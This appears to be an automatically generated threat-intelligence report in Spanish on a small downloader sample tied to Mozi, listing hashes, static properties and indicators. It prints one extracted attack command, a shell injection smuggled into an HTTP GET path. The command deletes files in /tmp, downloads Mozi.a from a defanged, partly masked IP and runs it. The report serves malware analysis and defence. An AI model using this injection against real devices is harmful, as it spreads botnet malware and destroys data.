# 🧬 Payload Analysis

`545de5285c3dbdb2bbacf08c9e034ce7be97f22e48099f5715c08059ba56ef9e`

## 📌 Resumen

Texto ASCII de 162 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.a` en `hxxp://115.56.155.XXX:46909/Mozi.a`. Se dispone de 1 comando observado o extraído. Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/545de5285c3dbdb2bbacf08c9e034ce7be97f22e48099f5715c08059ba56ef9e.md](../../../../../malware-like/oraculo/downloader/545de5285c3dbdb2bbacf08c9e034ce7be97f22e48099f5715c08059ba56ef9e.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:07:44.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `545de5285c3dbdb2bbacf08c9e034ce7be97f22e48099f5715c08059ba56ef9e`
- **SHA1:** `ddb3514c4ed1754d85d8e43a2003784108d5562b`
- **MD5:** `f0b4cf9ae433187061b2b68aaae81d31`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 162 B |
| Entropía | 5.28 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://115.56.155.XXX:46909/Mozi.a;sh${IFS}/tmp/M
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://115.56.155.XXX:46909/Mozi.a;sh$ | strings |
| ip | 115.56.155.XXX | static_analysis |
| command | GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://115.56.155.XXX:46909/Mozi.a;sh${IFS}/tmp/M | strings |
| hash | 545de5285c3dbdb2bbacf08c9e034ce7be97f22e48099f5715c08059ba56ef9e | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
